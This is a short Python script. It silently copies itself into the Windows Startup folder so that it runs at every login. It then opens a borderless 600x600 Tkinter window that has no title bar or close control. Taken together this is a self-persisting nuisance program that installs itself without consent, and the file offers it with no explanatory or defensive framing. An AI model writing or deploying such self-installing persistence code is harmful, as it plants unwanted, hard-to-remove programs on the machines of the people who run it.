from tkinter import *
import os
import shutil
from pathlib import Path

current_file_path = os.path.abspath(__file__)
startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startup_file_path = os.path.join(startup_folder, os.path.basename(current_file_path))

if not os.path.exists(startup_file_path):
    shutil.copy2(current_file_path, startup_file_path)
    

root = Tk()
root.geometry("600x600")
root.overrideredirect(True)
root.mainloop()